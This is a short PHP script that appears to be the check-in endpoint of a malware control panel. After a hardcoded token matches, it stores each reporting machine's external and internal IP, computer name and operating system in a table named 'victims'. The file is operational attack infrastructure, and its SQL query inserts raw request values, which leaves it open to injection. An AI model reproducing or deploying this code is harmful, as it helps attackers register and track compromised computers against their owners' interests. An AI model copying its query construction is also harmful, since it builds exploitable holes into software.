<?php
include("include/connection.php");
$personal_token = "93d664ea1f46b3b006e9da3c89c520d8";
$token = $_REQUEST["token"];

if ($token == $personal_token){
  //$ip_ext_fail = $_REQUEST["ip_victim"];
  $ip_ext = $_SERVER['REMOTE_ADDR'];
  $name = $_REQUEST["name_pc"];
  $ip_int = $_REQUEST["ip_interna"];
  $os = $_REQUEST["os_type"];
  $pers_token = $_REQUEST["personal_token"];
  openBD();
  $sql = "INSERT INTO victims (ip_victim, name_pc, ip_intern, os_type, personal_token) VALUES ('$ip_ext', '$name', '$ip_int', '$os', '$pers_token')";
  $result = $conn->query($sql);

}else{
  header("Location: app.php");
}

?>